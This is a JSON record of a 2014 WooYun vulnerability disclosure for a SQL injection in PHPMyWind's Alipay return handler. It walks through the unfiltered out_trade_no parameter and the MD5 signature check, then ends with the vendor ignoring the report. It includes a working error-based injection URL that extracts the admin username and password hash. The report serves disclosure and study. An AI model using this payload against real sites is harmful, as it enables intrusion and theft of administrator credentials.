{"id": 56579, "wybug_id": "wooyun-2014-057255", "wybug_title": "PHPMyWind最新版SQL注入漏洞", "wybug_corp": "phpmywind.com", "wybug_author": "xfkxfk", "wybug_date": "2014-04-16 10:36", "wybug_open_date": "2014-07-12 10:37", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射", "安全意识不足", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-21：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向公众公开  简要描述： PHPMyWind最新版SQL注入 详细说明：  文件：/data/alipay/return_url.php\n$alipayNotify = new AlipayNotify($alipay_config);$verify_result = $alipayNotify->verifyReturn();if($verify_result) {//验证成功\t/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\t//请在这里加上商户的业务逻辑程序代码\t\t//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——    //获取支付宝的通知返回参数，可参考技术文档中页面跳转同步通知参数列表\t//商户订单号\t$out_trade_no = $_GET['out_trade_no'];\t//支付宝交易号\t$trade_no = $_GET['trade_no'];\t//交易状态\t$trade_status = $_GET['trade_status'];    if($_GET['trade_status'] == 'TRADE_FINISHED' || $_GET['trade_status'] == 'TRADE_SUCCESS') {\t\t//判断该笔订单是否在商户网站中已经做过处理\t\t\t//如果没有做过处理，根据订单号（out_trade_no）在商户网站的订单系统中查到该笔订单的详细，并执行商户的业务程序\t\t\t//如果有做过处理，不执行商户的业务程序\t\t\t\t\t\t//更新订单状态\t\t\t$r = $dosql->GetOne(\"SELECT * FROM `#@__goodsorder` WHERE `id`=$out_trade_no\");\t\t\t\t\t\tif(isset($r) && is_array($r))\t\t\t{\t\t\t\t$checkinfo = explode(',',$r['checkinfo']);\t\t\t\t\t\tif(!in_array('payment',$checkinfo))\t\t\t\t{\t\t\t\t\t$sql = \"UPDATE `#@__goodsorder` SET checkinfo='\".$r['checkinfo'].',payment'.\"' WHERE `id`=$out_trade_no\";\t\t\t\t\t$dosql->ExecNoneQuery($sql);\t\t\t\t}\t\t\t}\t\t\t    }\n很明显，当验证成功时，out_trade_no没有过滤直接进入SQL，导致注入。下面来看看如何验证成功。\\data\\alipay\\lib\\alipay_notify.class.php文件verifyReturn函数：\nfunction verifyReturn(){\t\tif(empty($_GET)) {//判断POST来的数组是否为空\t\t\treturn false;\t\t}\t\telse {\t\t\t//生成签名结果\t\t\t$isSign = $this->getSignVeryfy($_GET, $_GET[\"sign\"]);\t\t\t//获取支付宝远程服务器ATN结果（验证是否是支付宝发来的消息）\t\t\t$responseTxt = 'true';\t\t\tif (! empty($_GET[\"notify_id\"])) {$responseTxt = $this->getResponse($_GET[\"notify_id\"]);}\t\t\t\t\t\t//写日志记录\t\t\t//if ($isSign) {\t\t\t//\t$isSignStr = 'true';\t\t\t//}\t\t\t//else {\t\t\t//\t$isSignStr = 'false';\t\t\t//}\t\t\t//$log_text = \"responseTxt=\".$responseTxt.\"\\n return_url_log:isSign=\".$isSignStr.\",\";\t\t\t//$log_text = $log_text.createLinkString($_GET);\t\t\t//logResult($log_text);\t\t\t\t\t\t//验证\t\t\t//$responsetTxt的结果不是true，与服务器设置问题、合作身份者ID、notify_id一分钟失效有关\t\t\t//isSign的结果不是true，与安全校验码、请求时的参数格式（如：带自定义参数等）、编码格式有关\t\t\tif (preg_match(\"/true$/i\",$responseTxt) && $isSign) {\t\t\t\treturn true;\t\t\t} else {\t\t\t\treturn false;\t\t\t}\t\t}\t}\n当$responseTxt && $isSign都为true时，验证成功。这里responseTxt 已经为true了。来看看isSign。再来看看getSignVeryfy函数：\nfunction getSignVeryfy($para_temp, $sign) {\t\t//除去待签名参数数组中的空值和签名参数\t\t$para_filter = paraFilter($para_temp);\t\t\t\t//对待签名参数数组排序\t\t$para_sort = argSort($para_filter);\t\t\t\t//把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串\t\t$prestr = createLinkstring($para_sort);\t\t\t\t$isSgin = false;\t\tswitch (strtoupper(trim($this->alipay_config['sign_type']))) {\t\t\tcase \"MD5\" :\t\t\t\t$isSgin = md5Verify($prestr, $sign, $this->alipay_config['key']);\t\t\t\tbreak;\t\t\tdefault :\t\t\t\t$isSgin = false;\t\t}\t\t\t\treturn $isSgin;\t}\n进入md5Verify：\nfunction md5Verify($prestr, $sign, $key) {\t$prestr = $prestr . $key;\t$mysgin = md5($prestr);\tif($mysgin == $sign) {\t\treturn true;\t}\telse {\t\treturn false;\t}\n从上克制，当sign=$mysgin = md5($prestr)=md5($prestr . $key)即可。$prestr就是我们传入的参数拼接。$key为在正常验证过程中alipay的key，配置信息。   漏洞证明：  EXP：\nhttp://127.0.0.1/phpmywind/data/alipay/return_url.php?sign=39c38708a1605e3c953ad2dc31b24fd0&trade_status=TRADE_FINISHED&out_trade_no=1 and 1=@`'` and 1=(select 1 from (select count(*),concat(floor(rand(0)*2),(SELECT concat(username,0x23,password) FROM `pmw_admin` limit 0,1))a from information_schema.tables group by a limit 0,1)b) and 1=@`'`\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-12 10:37 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-23 13:52 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  http://wooyun.org/bugs/wooyun-2014-053763  抄袭漏洞连证明图都不改=A=    \n     2014-04-23 13:55 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  看错了QAQ 大牛 无视我上面说的那句    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}